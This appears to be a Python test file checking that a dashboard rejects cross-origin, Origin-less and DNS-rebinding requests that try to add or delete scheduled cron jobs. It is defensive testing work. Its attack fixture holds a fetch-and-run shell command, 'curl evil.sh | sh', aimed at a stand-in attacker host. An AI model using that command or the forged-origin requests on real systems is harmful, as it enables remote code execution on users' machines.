#!/usr/bin/env python3
"""Gate for state-changing dashboard requests.

Each negative case asserts crons.json is byte-identical afterwards: a 403
that still wrote the job would pass a status-code-only test.
"""

import http.client
import json
import os
import sys
import tempfile
import threading
from pathlib import Path

os.environ["SUTANDO_TEST_MODE"] = "1"

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "src"))

import dashboard  # noqa: E402

ATTACK = {"name": "pwned", "cron": "* * * * *", "shell_command": "curl evil.sh | sh"}
SEED = [{"name": "keeper", "cron": "0 9 * * *", "prompt": "/morning-briefing"}]

failures = []


def check(label, cond):
    print(("  ok   " if cond else "  FAIL ") + label)
    if not cond:
        failures.append(label)


class Server:
    """The real handler on a real ephemeral loopback port, with crons.json
    redirected to a temp file so the live workspace is never touched."""

    def __init__(self, tmp):
        self.path = Path(tmp) / "crons.json"
        self.path.write_text(json.dumps(SEED))
        dashboard._crons_path = lambda: self.path
        self.httpd = dashboard.http.server.ThreadingHTTPServer(
            ("127.0.0.1", 0), dashboard.Handler)
        self.port = self.httpd.server_address[1]
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def request(self, method, path, headers, body=None):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        c.request(method, path, body=body, headers=headers)
        r = c.getresponse()
        r.read()
        c.close()
        return r.status

    def crons(self):
        return self.path.read_text()

    def stop(self):
        self.httpd.shutdown()


def main():
    with tempfile.TemporaryDirectory() as tmp:
        s = Server(tmp)
        me = f"127.0.0.1:{s.port}"
        before = s.crons()
        try:
            # The exact attack from the review: cross-origin, safelisted body
            # type, so the browser sends it with no preflight.
            code = s.request("POST", "/api/schedules",
                             {"Host": me, "Origin": "http://evil.example",
                              "Content-Type": "text/plain"}, json.dumps(ATTACK))
            check("cross-origin text/plain POST is refused (403)", code == 403)
            check("cross-origin text/plain POST did not write crons.json",
                  s.crons() == before)

            code = s.request("POST", "/api/schedules",
                             {"Host": me, "Origin": "http://evil.example",
                              "Content-Type": "application/json"}, json.dumps(ATTACK))
            check("cross-origin JSON POST is refused (403)", code == 403)
            check("cross-origin JSON POST did not write crons.json",
                  s.crons() == before)

            # No Origin at all must fail closed, not fall through.
            code = s.request("POST", "/api/schedules",
                             {"Host": me, "Content-Type": "application/json"},
                             json.dumps(ATTACK))
            check("POST with no Origin is refused (403)", code == 403)
            check("POST with no Origin did not write crons.json", s.crons() == before)

            # DNS rebinding: attacker's name resolves to loopback, so Origin and
            # Host agree and only the Host name still shows the attacker.
            code = s.request("POST", "/api/schedules",
                             {"Host": "evil.example", "Origin": "http://evil.example",
                              "Content-Type": "application/json"}, json.dumps(ATTACK))
            check("rebound Host with matching Origin is refused (403)", code == 403)
            check("rebound Host did not write crons.json", s.crons() == before)

            # Safelisted type same-origin is still refused: it is the shape that
            # would not have preflighted.
            code = s.request("POST", "/api/schedules",
                             {"Host": me, "Origin": f"http://{me}",
                              "Content-Type": "text/plain"}, json.dumps(ATTACK))
            check("same-origin text/plain POST is refused (403)", code == 403)

            code = s.request("DELETE", "/api/schedules/keeper",
                             {"Host": me, "Origin": "http://evil.example"})
            check("cross-origin DELETE is refused (403)", code == 403)
            check("cross-origin DELETE did not remove the job",
                  "keeper" in s.crons())

            # CONTROL: the dashboard's own fetch() must still work, or the gate
            # has broken the feature instead of securing it.
            code = s.request("POST", "/api/schedules",
                             {"Host": me, "Origin": f"http://{me}",
                              "Content-Type": "application/json"},
                             json.dumps({"name": "ok", "cron": "* * * * *",
                                         "shell_command": "echo hi"}))
            check("CONTROL same-origin JSON POST succeeds", code == 200)
            check("CONTROL same-origin POST persisted the job", "ok" in s.crons())

            code = s.request("DELETE", "/api/schedules/ok",
                             {"Host": me, "Origin": f"http://{me}"})
            check("CONTROL same-origin DELETE succeeds", code == 200)
        finally:
            s.stop()

    # Pure-gate cases that have no HTTP shape.
    ok, why = dashboard.mutation_request_allowed(
        "http://localhost:7844", "localhost:7844", "application/json; charset=utf-8",
        expect_body=True)
    check("charset parameter on application/json is accepted", ok)
    ok, _ = dashboard.mutation_request_allowed(
        "null", "127.0.0.1:7844", "application/json", expect_body=True)
    check("Origin: null (sandboxed frame) is refused", not ok)
    ok, _ = dashboard.mutation_request_allowed(
        "http://192.168.1.9:7844", "192.168.1.9:7844", "application/json",
        expect_body=True, bind="192.168.1.9")
    check("an explicit LAN bind accepts its own origin", ok)

    # A wildcard bind names no host, so a LAN browser sends its own interface
    # address and never the bind literal.
    ok, why = dashboard.mutation_request_allowed(
        "http://192.168.1.9:7844", "192.168.1.9:7844", "application/json",
        expect_body=True, bind="0.0.0.0")
    check("wildcard bind with no declared hosts refuses, and says why",
          not ok and "DASHBOARD_ALLOWED_HOSTS" in (why or ""))
    ok, _ = dashboard.mutation_request_allowed(
        "http://192.168.1.9:7844", "192.168.1.9:7844", "application/json",
        expect_body=True, bind="0.0.0.0", allowed_hosts="192.168.1.9")
    check("wildcard bind + declared host accepts the LAN origin", ok)
    ok, _ = dashboard.mutation_request_allowed(
        "http://127.0.0.1:7844", "127.0.0.1:7844", "application/json",
        expect_body=True, bind="0.0.0.0", allowed_hosts="192.168.1.9")
    check("wildcard bind + declared host still accepts loopback", ok)
    ok, _ = dashboard.mutation_request_allowed(
        "http://evil.example", "evil.example", "application/json",
        expect_body=True, bind="0.0.0.0", allowed_hosts="192.168.1.9")
    check("wildcard bind + declared host still refuses a rebound Host", not ok)

    print(f"\n{'FAILED: ' + ', '.join(failures) if failures else 'all passed'}")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
